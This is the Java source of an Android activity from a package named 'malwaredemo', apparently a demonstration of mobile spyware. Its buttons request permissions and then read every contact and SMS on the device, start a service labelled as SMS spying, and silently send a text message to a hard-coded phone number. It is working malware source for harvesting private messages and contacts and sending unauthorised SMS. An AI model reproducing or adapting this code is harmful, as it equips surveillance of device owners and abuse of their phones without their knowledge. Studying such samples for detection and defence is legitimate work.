package com.malwaredemo.app;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.malwaredemo.app.databinding.ActivityMainBinding;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "Contact_Test";
    private static final int PERMISS_CONTACT = 1;
    private static final int PERMISSION_READ_SMS = 2;
    private static final int PERMISSION_SEND_SMS = 3;
    private Button getContact;
    private Button getSMS;
    private Button spySmsButton;
    private TextView showContent;

    // Used to load the 'app' library on application startup.
    static {
        System.loadLibrary("app");
    }

    private ActivityMainBinding binding;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Example of a call to a native method
        Log.e("SDK_INT", String.valueOf(Build.VERSION.SDK_INT));
        initMalwareFunc();

    }


    private void initMalwareFunc() {
        getContact = findViewById(R.id.contactButton);
        getSMS = findViewById(R.id.SMSButton);
        showContent = findViewById(R.id.textView);
        spySmsButton = findViewById(R.id.spySmsButton);
        getContact.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] permissList = {Manifest.permission.READ_CONTACTS,Manifest.permission.CALL_PHONE, Manifest.permission.READ_SMS};
                addPermissionList(MainActivity.this, permissList, PERMISS_CONTACT);
            }
        });
        getSMS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] permissList = {Manifest.permission.READ_SMS};
                addPermissionList(MainActivity.this, permissList, PERMISSION_READ_SMS);
            }
        });
        spySmsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent smsService = new Intent(MainActivity.this, SmsService.class);
                MainActivity.this.startService(smsService);
                Toast.makeText(MainActivity.this, "监听短信服务开启成功！", Toast.LENGTH_SHORT).show();
            }
        });
        Button sendSmsButton = findViewById(R.id.sendSmsButton);
        sendSmsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] permissList = {Manifest.permission.SEND_SMS};
                addPermissionList(MainActivity.this, permissList, PERMISSION_SEND_SMS);
            }
        });
    }
    private void sendSms(){
        SendSmsBroadcastReceiver sendSmsBroadcastReceiver = new SendSmsBroadcastReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(SendSmsBroadcastReceiver.ACTION);
        registerReceiver(sendSmsBroadcastReceiver,intentFilter);
        //必须先注册广播接收器  否则接收不到发送结果


        SmsManager smsManager = SmsManager.getDefault();
        Intent intent = new Intent();
        intent.setAction(SendSmsBroadcastReceiver.ACTION);
        ArrayList<String> divideMessage = smsManager.divideMessage("dasdafa");
        PendingIntent sendIntent = PendingIntent.getBroadcast(MainActivity.this, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        ArrayList<PendingIntent> pendingIntents = new ArrayList<>();
        pendingIntents.add(sendIntent);

        try {
            smsManager.sendMultipartTextMessage("18737695639",null,divideMessage,pendingIntents,null);

        } catch (Exception e){
            e.printStackTrace();
        }
    }
    private void showContacts() {
        ArrayList<MyContacts> contacts = ContactUtils.getAllContacts(MainActivity.this);

        showContent.setText(contacts.toString());
        Log.e(TAG, "contacts:" + contacts.toString());
    }

    private void showSMS() {
        String smsInPhone = ReadTextMessage.getSmsInPhone(MainActivity.this);
        showContent.setText(smsInPhone);
        Log.e(TAG, "contacts:" + smsInPhone);
    }
    /**
     * 1、动态权限
     */
    public void addPermissionList(Activity activity,String[] permissions,int request){
        // Build.VERSION_CODES.M == 23   Build.VERSION.SDK_INT==25
        //Build.VERSION.SDK_IN 用来获取当前设备的 Android SDK 版本

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            ArrayList<String> mPermissionsList = new ArrayList<>();

            for (int i = 0;i < permissions.length;i++){
                /**
                 * 第一步判断用户是不是已经给过授权
                 *
                 * - 借助的是ContextCompat.checkSelfPermission方法 接收两个参数
                 *   - 第一个参数是Context
                 *   - 第二个是具体的权限名 比如打电话的权限名就是 Manifest.permission.CALL_PHONE
                 *   - 然后使用方法的返回值和PackManager.PERMISSION_GRANTED做比较 相等就是已经授权  不相等就是没有授权
                 */
                if (ContextCompat.checkSelfPermission(activity,permissions[i]) != PackageManager.PERMISSION_GRANTED){
                    mPermissionsList.add(permissions[i]);
                }
            }
            if (mPermissionsList.isEmpty()){
                ///非初次进入App且已授权
                if (request == 1){
                    showContacts();
                }else if (request == 2){
                    showSMS();
                }else if (request == 3){
                    sendSms();
                }

                Toast.makeText(this, "已授权", Toast.LENGTH_SHORT).show();
            }else{
                //请求权限方法
                Log.e("mPermissionsList", mPermissionsList.toString());
                String[] permissionsNew = mPermissionsList.toArray(new String[mPermissionsList.size()]);//将List 转为数组
                Log.e("permissionsNew", String.valueOf(permissionsNew[0]));
                ActivityCompat.requestPermissions(activity,permissionsNew,request);
            }
        }
    }



    /**
     * 2、requestPermissions的回调
     * 一个或多个权限请求结果回调
     * 重写onRequestPermissionsResult方法根据用户的不同选择做出响应
     */

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.e("grantResults", String.valueOf(grantResults.length));
        for (int grantResult : grantResults) {
            Log.e("grantResult", String.valueOf(grantResult));
        }
        Log.e("PackageManager", String.valueOf(PackageManager.PERMISSION_GRANTED));
        Log.e("requestCode", String.valueOf(requestCode));
        switch (requestCode){
            case 1:
                if (grantResults.length > 0 & grantResults[0]==PackageManager.PERMISSION_GRANTED){
                    showContacts();
                    Log.e("Agree Permission", "Agree Permission");
                    Toast.makeText(this, "Agree Permission！", Toast.LENGTH_SHORT).show();
                }else{
                    dealWithPerssion(MainActivity.this,permissions[0]);
                }
                break;
            case 2:
                if (grantResults.length > 0 & grantResults[0]==PackageManager.PERMISSION_GRANTED){
                    showSMS();
                    Log.e("Agree Permission", "Agree Permission");
                    Toast.makeText(this, "Agree Permission！", Toast.LENGTH_SHORT).show();
                }else{
                    dealWithPerssion(MainActivity.this,permissions[0]);
                }
                break;
            case 3:
                if (grantResults.length > 0 & grantResults[0]==PackageManager.PERMISSION_GRANTED){
                    sendSms();
                    Log.e("Agree Permission", "Agree Permission");
                    Toast.makeText(this, "Agree Permission！", Toast.LENGTH_SHORT).show();
                }else{
                    dealWithPerssion(MainActivity.this,permissions[0]);
                }
                break;
            default:
        }
//        boolean hasAllGranted = false;
//        //判断是否拒绝 拒绝后如何处理 以及取消再次提示的处理
//        for(int grantResult : grantResults){
//            Log.e("grantResult", String.valueOf(grantResult));
//            Log.e("PackageManager", String.valueOf(PackageManager.PERMISSION_GRANTED));
//            if (grantResult == PackageManager.PERMISSION_GRANTED){
//                hasAllGranted = true;
//                break;
//            }
//        }
//        if (hasAllGranted){//Agree Permission open service upload contacts
//            showContacts();
//            Toast.makeText(this, "Agree Permission！", Toast.LENGTH_SHORT).show();
//        }else{
//            //reject Permission  Tips user to  grant
//            Log.e("reject Permission", permissions[0]);
//            dealWithPerssion(MainActivity.this,permissions[0]);
//        }
    }


    /**
     * Reject deal function
     * @param context
     * @param permission
     */
    public void dealWithPerssion(final Activity context,String permission){
        Log.e("TORF", String.valueOf(ActivityCompat.shouldShowRequestPermissionRationale(context,permission)==true));
        if (ActivityCompat.shouldShowRequestPermissionRationale(context,permission)){
            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder.setTitle("Option Tips!")
                    .setMessage("Must be this permission")
                    .setPositiveButton("Go to Grant this permission", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            Uri uri = Uri.fromParts("package", context.getApplicationContext().getPackageName(), null);
                            intent.setData(uri);
                            context.startActivity(intent);
                        }
                    })
                    .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            Toast.makeText(MainActivity.this,"Cancel this option",Toast.LENGTH_SHORT).show();
                        }
                    }).show();
        }
    }



    /**
     * A native method that is implemented by the 'app' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();

}